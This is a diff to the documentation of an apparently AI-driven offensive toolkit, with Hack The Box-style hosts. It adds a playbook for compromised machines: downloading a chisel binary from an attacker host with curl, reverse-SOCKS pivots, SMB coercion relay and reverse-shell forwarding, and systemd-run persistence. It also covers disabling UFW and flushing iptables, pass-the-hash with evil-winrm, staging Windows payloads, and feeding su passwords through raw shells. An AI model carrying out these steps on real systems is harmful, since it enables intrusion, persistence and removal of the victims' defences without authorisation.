@@ -8,14 +8,53 @@ Launches the backend detached (survives the call), parses the live endpoint, tra
 
 - **`vpn`** — OpenVPN. Profile inline (`config`) or by reference (`config_ref` = container path / artifact SHA / `mcp://artifacts/<sha>`), plus `auth_user`/`auth_pass`. Returns `iface=tun0` + assigned IP. Config written base64-safe (no inline-transfer corruption).
 - **`expose`** — publish a local port to a public URL (webhooks, file serving, exposing a listener). `backend` `pinggy` (default; `protocol` http/tcp/tls, optional `token`) or `bore` (`token`=secret).
-- **`proxy`** — SOCKS pivot. `chisel` (reverse SOCKS from a compromised host), `ligolo` (TUN pivot; pass `ligolo_subnet=<CIDR>` to auto-create tun+route, `ligolo_webui=True` to manage from https://127.0.0.1:11601), or `ssh` (`-D` dynamic SOCKS via a jump `server`, also writes a proxychains config). Route tools through `proxychains_run`.
+- **`proxy`** — SOCKS pivot. `chisel` (reverse SOCKS from a compromised host) or `ssh` (`-D` dynamic SOCKS via a jump `server`, also writes a proxychains config). Route tools through `proxychains_run`.
 - **`forward`** — point-to-point port forward over `ssh` (`-L`/`-R`) or `chisel`.
 
 ```python
 run_tool("tunnel_up", {"kind":"vpn","config_ref":"mcp://artifacts/<sha>"})       # → iface=tun0, endpoint=<IP>
 run_tool("tunnel_up", {"kind":"expose","backend":"bore","local_port":8000})       # → public host:port
-run_tool("tunnel_up", {"kind":"proxy","backend":"ssh","server":"user@jump"})      # → socks5://127.0.0.1:1080
+run_tool("tunnel_up", {"kind":"proxy","backend":"chisel","server":"<pivot>:8000"})    # → socks5://127.0.0.1:1080
+run_tool("tunnel_up", {"kind":"proxy","backend":"ssh","server":"user@jump"})          # → socks5://127.0.0.1:1080
 run_tool("tunnel_list", {}); run_tool("tunnel_status", {"tunnel_id":"tnl-…"}); run_tool("tunnel_down", {"tunnel_id":"tnl-…"})
+```
+
+**Reverse-SOCKS chisel needs the client binary ON the compromised host.** On an ultra-minimal target (only `bash`/`curl`/`wget`, no python/nc/socat — common in app containers) don't hand-roll a forwarder: push the static `chisel` from the depot (`/opt/linux-payloads/chisel`, `list_payloads`/`get_payload`) with `upload_to_target(backend=http)` (or serve it yourself: `nohup python3 -m http.server` on the container + `curl -o /tmp/chisel http://<LHOST>:<port>/chisel` on the target), then `chisel server -p 8000 --reverse --socks5` (container) ↔ `/tmp/chisel client <LHOST>:8000 R:socks` (target) → SOCKS on `127.0.0.1:1080` → `proxychains_run`. The target can reach `<LHOST>` (that's how the callback got there); a *new* inbound to it usually can't.
+
+**Chisel is the reliable MCPwn pivot.** Chisel has no interactive console — server and client are one-shot commands that connect and run, fully compatible with `start_interactive_shell` and `execute_command`. Use chisel for all SOCKS/forward pivots.
+
+**Chisel multi-forward pattern (proven reliable):** serve files AND relay SMB/callbacks through the same tunnel:
+```
+# Container — run as managed interactive shell (persists):
+start_interactive_shell(sid, "chisel server --port 8000 --reverse --socks5")
+
+# Box — systemd-run for persistence across shell deaths:
+sudo systemd-run --unit=pivot-chisel --collect /tmp/chisel client <LHOST>:8000 \
+  R:socks 0.0.0.0:445:<LHOST>:445 0.0.0.0:4445:<LHOST>:4445 0.0.0.0:80:<LHOST>:8099
+```
+This gives: container SOCKS5 on 127.0.0.1:1080 into the internal net; box:445 → container Responder (coercion relay); box:4445 → container listener (reverse shells from internal hosts); box:80 → container HTTP server (payload delivery to internal hosts that can only reach the box).
+
+**proxychains config** — `/etc/proxychains4.conf` is often read-only in the container; write a custom conf to `/tmp/pc.conf` and use `proxychains4 -q -f /tmp/pc.conf`:
+```
+strict_chain
+proxy_dns
+remote_dns_subnet 224
+tcp_read_time_out 15000
+tcp_connect_time_out 8000
+[ProxyList]
+socks5 127.0.0.1 1080
+```
+
+**systemd-run persistence on the box:** when the compromised host runs systemd and you have root, launch persistent processes as transient systemd units — they survive shell deaths and service restarts (unlike `setsid`/`nohup` which die with the cgroup):
+```
+sudo systemd-run --unit=pivot-chisel --collect /tmp/chisel client ...
+sudo systemctl set-property aegis.service TasksMax=infinity  # prevent cgroup PID exhaustion
+```
+
+**Post-reset checklist:** UFW and iptables re-enable after a box reset. Immediately:
+```
+sudo ufw disable
+sudo iptables -F; sudo iptables -X; sudo iptables -P INPUT ACCEPT; sudo iptables -P FORWARD ACCEPT; sudo iptables -P OUTPUT ACCEPT
 ```
 
 ## `tunnel_revshell` — reachable LHOST:LPORT + payloads
@@ -53,7 +92,7 @@ A raw Windows callback (nc.exe, ConPtyShell, `RunasCs`) has no Unix PTY — do *
   3. Get a TGT → ccache: `impacket-getTGT <domain>/<user>:<pass>` (or `-hashes :<nt>`), then `export KRB5CCNAME=<user>.ccache`.
   4. Use the ticket: `evil-winrm -i <dc.fqdn> -u <user> -r <REALM>` (Kerberos), or `netexec winrm <dc> -u <user> -k` / `netexec smb <dc> -u <user> -k`. Impacket scripts run as `impacket-<name>` or `<name>.py`; `kinit`/`klist` are present too.
 - **Ship a payload to the Windows target** (ConPtyShell, RunasCs, a Potato): `list_payloads` → `get_payload` → `upload_to_target(backend=smb|scp|http, ...)` — the depot at `/opt/windows-payloads/` is pre-staged and PtH-aware. Then trigger it to call back to your `tunnel_revshell` LHOST:LPORT.
-- **Pivot to reach an internal DC/host first** if 5985/445 aren't directly routable: `tunnel_up kind=proxy` (ligolo/chisel) then run `evil-winrm`/`netexec`/impacket through `proxychains_run`.
+- **Pivot to reach an internal DC/host first** if 5985/445 aren't directly routable: `tunnel_up kind=proxy backend=chisel` then run `evil-winrm`/`netexec`/impacket through `proxychains_run`.
 
 Quick shape:
 ```python
@@ -69,6 +108,8 @@ start_interactive_shell(session_id, "evil-winrm -i dc.corp.htb -u svc -H <nthash
 
 A raw catcher has no remote pty: output fragments, prompts stay blank, the local pty line discipline eats control chars.
 - **Output you need**: run `cmd > /tmp/o 2>&1; cat /tmp/o` — don't rely on the live stream.
+- **Short output can still come back blank** even via `cat` (no remote pty → the local line discipline eats CR/short lines): a 34-byte flag `cat`s as empty. Read the *value* out-of-band — `base64 <file>` or `od -c <file>` — and decode locally. This is the reliable way to lift a flag/hash/key off a raw shell.
+- **`su`/`sudo` password entry fails on a raw channel**: `su` reads `/dev/tty`, not stdin, so `echo pw | su user`, a heredoc, and `su … < pw.txt` all give `Authentication failure` or hang — the password never reaches it. Fixes, in order: (1) `stabilize_shell` first — a real target pty makes `su`/`sudo` prompt normally; (2) drive it turn-by-turn with `send_to_shell` — send `su user`, wait for `Password:`, `send_to_shell(id,"pw\n")`, then run commands in the elevated shell; (3) `sudo -S` is the one that *does* read stdin: `echo pw | sudo -S cmd`.
 - **Background watchers**: `setsid cmd &` or `nohup cmd &` — a bare `&` dies when the channel hiccups or the shell is re-caught.
 - **Never SIGINT the listener to stop a remote job**: `signal_interactive_shell(SIGINT)` sends 0x03 to the LOCAL pty → the line discipline kills `nc` and the shell drops; it never reaches the remote. Use the file-redirect pattern or a remote pty.
 - **pty-in-pty caveat**: `python3 -c 'import pty;pty.spawn("/bin/bash")'` shifts the local relay's echo/prompt/ANSI handling; set `stty raw -echo` locally when driving a full-screen program.
